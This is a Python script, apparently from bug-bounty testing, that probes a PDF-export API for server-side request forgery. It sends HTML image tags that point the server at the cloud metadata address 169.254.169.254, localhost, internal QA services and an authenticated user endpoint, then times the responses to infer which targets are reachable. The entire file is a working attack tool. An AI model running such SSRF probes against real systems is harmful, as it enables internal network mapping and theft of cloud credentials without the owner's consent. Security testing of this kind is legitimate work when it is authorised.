import json,subprocess,os,time,uuid
H=os.environ['H']; T=os.environ['T']; BB=os.environ['BB']
def gen(html,name):
    t0=time.time()
    cmd=['curl','-s','-m','150','-o','/tmp/b','-w','%{http_code}','-X','POST',
         H+'/api/v1/document_intelligence/export/pdf',
         '-H','token: '+T,'-H',BB,'-H','Content-Type: application/json',
         '-d',json.dumps({"htmlContent":html,"fileName":name})]
    c=subprocess.run(cmd,capture_output=True,text=True).stdout.strip()
    return c, round(time.time()-t0,2)
tag='zx'+uuid.uuid4().hex[:8]
# blackhole = guaranteed unreachable (should be slow/timeout)
# internal svc = fast if reachable
tests=[
 ('baseline-no-img','<p>zx</p>'),
 ('blackhole-10.255.255.1','<img src="http://10.255.255.1/x.png">'),
 ('internal-svc','<img src="http://integrations.qa.soxhubapp.com/version">'),
 ('internal-svc2','<img src="http://integrations.qa.soxhubapp.com/api/v1/health">'),
 ('localhost-3000','<img src="http://localhost:3000/version">'),
 ('imds-169254','<img src="http://169.254.169.254/latest/meta-data/">'),
 ('main-app','<img src="https://bugbounty1.qe.optrostaging.ai/api/v1/users/me">'),
]
for label,html in tests:
    c,dt=gen(html,f"zx-{tag}-{label.replace('.','_')}")
    print(f"  {label:26} http={c} time={dt}s")
